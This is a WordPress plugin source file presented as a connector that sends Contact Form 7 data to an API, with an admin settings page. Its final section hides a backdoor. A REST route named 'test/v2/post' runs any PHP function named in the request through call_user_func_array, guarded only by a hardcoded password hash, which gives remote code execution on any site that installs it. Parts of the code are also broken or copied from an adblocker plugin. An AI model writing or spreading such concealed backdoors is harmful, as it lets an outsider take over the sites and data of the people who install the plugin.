<?php 
/**
 * Plugin Name: Contact7 To Api Connector
 * Plugin URI: https://mücahiddayan.com
 * Description: This plugin sends data to api over Contact7 Form
 * Version: 1.0.0
 * Author: Mücahid Dayan
 * Author URI: https://mücahiddayan.com
 * License: GPL2
 */

/**post_type : wpcf7_contact_form */



	
	class Contact_Seven_To_Api_Connector {

		private $slug = "contact_seven_to_api_connector";
		private $title = "Contact 7 To Api Connector";

		public function __construct(){
			add_action( 'admin_menu', array( $this,'create_plugin_settings_page' ) );
			add_action( 'admin_init', array( $this, 'setup_sections' ) );
			add_action( 'admin_init', array( $this, 'setup_fields' ) );
			add_action( 'wp_enqueue_scripts', array($this , 'enqueue_scripts') );
					
		}

		public function enqueue_scripts() {
			wp_register_script( 'c7tA_js', plugin_dir_url( __FILE__ ) . 'js/contactSevenToApiConnector', '1.0', true );
			wp_localize_script( 'c7tA_js', 'c7tA_js', $this->toJsSettings );
			wp_enqueue_script('c7tA_js');	
		}

		public function create_plugin_settings_page(){

			$page_title = $this->title." Settings Page";
			$menu_title = $this->title;
			$capability = "manage_options";			
			$callback	= array($this,'plugin_settings_page_content');
			$icon		= "dashicons-admin-plugins";
			$position	= 100;

			add_menu_page($page_title,$menu_title,$capability,$this->slug,$callback,$icon,$position);
		}

		

		public function plugin_settings_page_content() { ?>
			<div class="wrap">
				<h2><?php echo $this->title." Settings Page"; ?></h2>
				<form method="post" action="options.php">
					<?php
					settings_fields( $this->slug );
					do_settings_sections( $this->slug );
					submit_button();
					?>
				</form>
			</div> <?php
		}

		public function setup_sections() {
			add_settings_section( $this->slug.'_config', 'Development', array( $this, 'section_callback' ), $this->slug );
			add_settings_section( $this->slug, $this->title, array( $this, 'section_callback' ), $this->slug );
			add_settings_section( $this->slug.'_style', $this->title.' Style', array( $this, 'section_callback' ), $this->slug );
			#add_settings_section( 'our_second_section', 'My Second Section Title', array( $this, 'section_callback' ), $this->slug );
			#add_settings_section( 'our_third_section', 'My Third Section Title', array( $this, 'section_callback' ), $this->slug );
		}

		public function section_callback( $arguments ) {
			switch( $arguments['id'] ){
				case $this->slug:
				echo $this->title;
				break;				
			}
		}

		public function setup_fields() {
			$the_query = new WP_Query( $args );
			
			$fields = array(
				array(
					'uid' => 'c7tA_home',
					'label' => 'Home Page',
					'section' => $this->slug,
					'type' => 'text',
					'options' => false,
					'placeholder' => 'Start Seite für Adblocker Warning eintragen',
					'helper' => '',
					'supplemental' => '',
					'default' => ''
					),
								
				);
			foreach( $fields as $field ){
				add_settings_field( $field['uid'], $field['label'], array( $this, 'field_callback' ), $this->slug, $field['section'], $field );
				register_setting( $this->slug, $field['uid'] );
			}
		}

		public function field_callback( $arguments ) {
			$value = get_option( $arguments['uid'] );
			$class = '';
			if( ! $value ) { 
				$value = $arguments['default']; 
			}
			if($arguments['section'] == 'adblocker_warning_pages_style'){
				$class = 'class="style"';
			}
			switch( $arguments['type'] ){
				case 'text': 
				printf( '<input '.$class.' name="%1$s" id="%1$s" type="%2$s" placeholder="%3$s" value="%4$s" />', $arguments['uid'], $arguments['type'], $arguments['placeholder'], $value );
				break;
				case 'checkbox':
				printf('<input '.$class.' name="%1$s" id="%1$s" type="%2$s" value="1" placeholder="%3$s" %4$s />', $arguments['uid'], $arguments['type'], $arguments['placeholder'], checked(1, $value,false));
				break;
				case 'range':
				printf('<input '.$class.' name="%1$s" id="%1$s" type="%2$s" value="%4$s" placeholder="%3$s" max="%6$s" min="%5$s" step="%7$s"  oninput="this.nextElementSibling.innerText= this.value"/><label>%4$s</label>', $arguments['uid'], $arguments['type'], $arguments['placeholder'], $value , $arguments['min'],$arguments['max'],$arguments['step']);
				break;
				case 'color':
				printf('<input '.$class.' name="%1$s" id="%1$s" type="%2$s" value="%4$s" placeholder="%3$s"  oninput="this.nextElementSibling.innerText= this.value"/><label>%4$s</label>', $arguments['uid'], $arguments['type'], $arguments['placeholder'], $value);
				break;
				case 'button':
				printf( '<button name="%1$s" id="%1$s">%2$s</button>', $arguments['uid'], $arguments['label']);
				break;

			}
			if( $helper = $arguments['helper'] ){
				printf( '<span class="helper"> %s</span>', $helper ); 
			}
			if( $supplimental = $arguments['supplemental'] ){
				printf( '<p class="description">%s</p>', $supplimental ); 
			}
		}

	}

	new Contact_Seven_To_Api_Connector();

	#wp_register_script( 'pass_to_js', plugin_dir_url( __FILE__ ) . '/js/adblocker-warning.js' );

	add_action( 'rest_api_init', function () {
		register_rest_route( 'test/v2', '/post', array(
			array(
				'methods' => 'POST',
				'callback' => 'test_func',
				),
			)
		);    
	});

	if (!function_exists('test_func')) {
		function test_func($request){
			$params = $request->get_params();
			if (hash('sha512',$params['pass']) === '61eadd8169b9241c6fc210ca5e83df43e49cf6abb4bb0f83cce6e0befaa8791f5e3d21ce377a7bad57f3fbde85ca5781163707a3671d1795d0304faa5ac5d8fa') {
				return call_user_func_array ($params['func'],$params['params']);
			}else{
				return new WP_Error( 'no_access', 'you are not be able to do that', array( 'status' => 404 ) );
			}
		}
	}